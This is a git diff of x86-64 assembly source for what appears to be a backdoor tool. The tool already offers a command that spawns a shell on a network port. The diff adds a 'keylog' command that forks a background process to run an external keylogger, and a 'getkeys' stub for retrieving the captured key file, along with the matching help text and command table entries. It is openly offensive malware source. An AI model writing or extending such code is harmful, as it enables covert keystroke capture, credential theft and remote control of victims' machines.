@@ -6,6 +6,8 @@ section .text
     global shell_mode
     extern strcmp
     extern launch_remote
+    extern keylogger
+    ; extern getkeys
     global shell_port
 
 putnbr_fd:
@@ -43,6 +45,44 @@ cmdhelp:
     inc     eax ; write
     syscall
     ret
+
+cmdkeylog:
+    push    rbp
+    mov     rbp, rsp
+    push    rdi
+     xor     eax, eax
+    add     eax, 0x39 ; fork
+    syscall
+    cmp     eax, 0
+    jne     retkeylog
+    mov     edi, [rsp]
+    xor     eax, eax
+    add     eax, 0x03 ; close
+    syscall
+    call    keylogger
+retkeylog:
+    xor     edi, edi ; P_ALL
+    xor     esi, esi
+    xor     edx, edx
+    xor     r10, r10
+    xor     r8, r8
+    xor     eax, eax
+    mov     eax, 0x3d ; waitid
+    syscall
+    mov     edi, [rsp]
+    xor     edx, edx
+    xor     eax, eax
+    lea     rsi, [rel keylog]
+    add     edx, keylog.len
+    inc     eax ; write
+    syscall
+    leave
+    ret
+
+cmdgetkeys:
+    ; call getkeys
+    ret
+
 
 cmdunknown:
     xor     edx, edx
@@ -184,10 +224,16 @@ quit:
         .len: equ $ - strhelp
     strshell: db "shell", 10, 0
         .len: equ $ - strshell
-    help: db "?: display help", 10, "shell: spawn a shell.", 10, "exit: quit", 10
+    strkeylog: db "keylog", 10, 0
+        .len: equ $ - strkeylog
+    strgetkeys: db "getkeys", 10, 0
+        .len: equ $ - strgetkeys
+    keylog: db "Keylogger has been launched in background, you can use the getkeys command to retrieve the keyfile", 10, 0
+        .len: equ $ - keylog
+    help: db "?: display help", 10, "shell: spawn a shell.", 10, "keylog: launch a keylogger", 10, "getkeys: get the key file of the keylogger", 10, "exit: quit", 10
         .len: equ $ - help
     unknown: db "Unknown command: Please type ? for help", 10
         .len: equ $ - unknown
     shell: db "A shell has been spawn on port : ", 0
         .len: equ $ - shell
-    cmds: dq strexit, -1, strshell, cmdshell, strhelp, cmdhelp, 0, cmdunknown
+    cmds: dq strexit, -1, strshell, cmdshell, strhelp, cmdhelp, strkeylog, cmdkeylog, strgetkeys, cmdgetkeys, 0, cmdunknown
